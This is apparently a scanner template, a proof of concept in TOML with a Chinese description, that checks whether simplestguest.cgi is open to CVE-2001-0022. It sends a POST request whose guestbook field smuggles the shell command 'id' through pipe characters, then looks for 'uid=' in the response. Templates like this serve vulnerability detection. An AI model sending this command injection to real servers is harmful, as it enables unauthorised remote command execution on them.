[info]
author = "ave"
description = "通过向 simplestguest.cgi 发送包含 shell 元字符的 POST 请求，检测目标是否存在远程命令执行漏洞。若响应中包含命令执行结果（如 uid=），则确认漏洞存在。"
id = "POC-AVE-2001-0009"
name = "Leif M. Wright simplestguest.cgi 远程命令执行 PoC"
severity = "critical"
tags = ["ave-2001-0009"]
vuln_id = [
    "CVE-2001-0022",
    "AVE-2001-0009",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/simplestguest.cgi"
protocol = "http"

[poc.requests.body]
content = "required=NAME&guestbook=%20%7C%20id%20%7C&NAME=user"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
